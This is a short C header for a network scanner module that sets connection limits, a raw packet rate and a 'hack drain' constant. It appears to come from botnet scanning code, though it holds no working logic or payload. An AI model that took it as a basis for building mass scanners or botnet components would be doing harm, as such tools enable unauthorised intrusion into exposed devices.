#ifndef SCANNER_H
#define SCANNER_H

#define SCANNER_MAX_CONNS   128
#define SCANNER_RAW_PPS     160
#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64

void scanner_init(void);

#endif /* SCANNER_H */